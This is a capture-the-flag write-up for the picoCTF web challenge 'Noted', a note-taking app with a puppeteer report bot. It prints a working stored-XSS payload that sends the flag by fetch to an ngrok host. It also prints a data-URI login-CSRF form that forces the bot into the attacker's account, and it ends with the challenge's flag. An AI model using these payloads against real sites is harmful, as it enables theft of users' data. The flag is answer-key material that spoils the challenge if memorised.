# Noted

## Description

I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right?
Note that the headless browser used for the "report" feature does **not** have access to the internet.

Hint 1: Are you *sure* I followed all the best practices?

Hint 2: There's more than just HTTP(S)!

Hint 3: Things that require user interaction normally in Chrome might not require it in Headless Chrome.

## Approach

This challenge took many attempts before I arrived at the correct solution. I attempted Javascript URIs, CSRF protection bypass, SOP bypass, and some XSS methods. 

This website allows the user to create notes, and includes a login system. Let's go over the rest of the website. Here's `report.js`:
```javascript
async function run(url) {
    let browser;

    try {
        module.exports.open = true;
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
            slowMo: 10
        });

        let page = (await browser.pages())[0]

        await page.goto('http://0.0.0.0:8080/register');
        await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
        await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

        await Promise.all([
            page.click('[type="submit"]'),
            page.waitForNavigation({ waituntil: 'domcontentloaded' })
        ]);

        await page.goto('http://0.0.0.0:8080/new');
        await page.type('[name="title"]', 'flag');
        await page.type('[name="content"]', process.env.flag ?? 'ctf{flag}');

        await Promise.all([
            page.click('[type="submit"]'),
            page.waitForNavigation({ waituntil: 'domcontentloaded' })
        ]);

        await page.goto('about:blank')
        await page.goto(url);
        await page.waitForTimeout(7500);

        await browser.close();
    } catch(e) {
        console.error(e);
        try { await browser.close() } catch(e) {}
    }

    module.exports.open = false;
}
```
The report function uses puppeteer, an API that allows the automated control of the *headless, non-sandboxed* browser. This means that there is no human "admin" (although in a real world situation, there may be).

So, what happens when the user submits a link to the report page?
* Puppeteer creates a new account with a random username and password
* It creates a note under that new user, with the flag contained inside (process.env.flag)
* Only after this, does the bot open the URL that we provide through `/reports`

Originally, I planned to use Data/Javascript URIs to retrieve the account credentials, but this was not possible due to SOP. Also, the fetch API cannot be used due to CSRF tokens. It is important to note that the challenge creators mentioned that the headless browser did not have access to the internet; However, a couple of ports were open. Although this will not change the real solution, it will make exfiltration more streamlined. 

The idea is to create a note with a Javascript script embedded. Any user that opens the webpage will thus also execute the script. The script will contain the exfiltration process. Next, we can submit a Data URI forcing the headless browser to login to our account, then navigate to `/notes`. This will execute the note mentioned previously, allowing the retrieval of the flag. Here's the code:

Note:
```HTML
<script>let flagWindow = window.open('', 'flagWindow'); let flag = flagWindow.document.getElementsByTagName('p')[0].innerText; fetch('https://www.ngrok.io/link_here?flag='+flag);</script>
```

Report:
```HTML
data:text/html,
<body>
  <form action="http://0.0.0.0:8080/login" method="POST" id="vuln" target="_blank">
    <input type="text" name="username" placeholder="username" value="arst">
    <br><br>
    <input type="password" name="password" placeholder="password" value="arst">
    <br><br>
    <input type="submit" value="Submit">
</form>
    <script>
        var w1 = window.open('http://0.0.0.0:8080/notes', 'flagWindow');
        vuln.submit();
    </script>
</body>
```

The note will exfiltrate to an "ngrok" website (you can use any web server you have) through a GET request, including in the parameters. When submitting the preceding URI through `/report`, we will receive a GET request, visible through ngrok's console: 

![Console](/Web%20Exploitation/Noted/Console.png)

Thus, the flag is: picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}
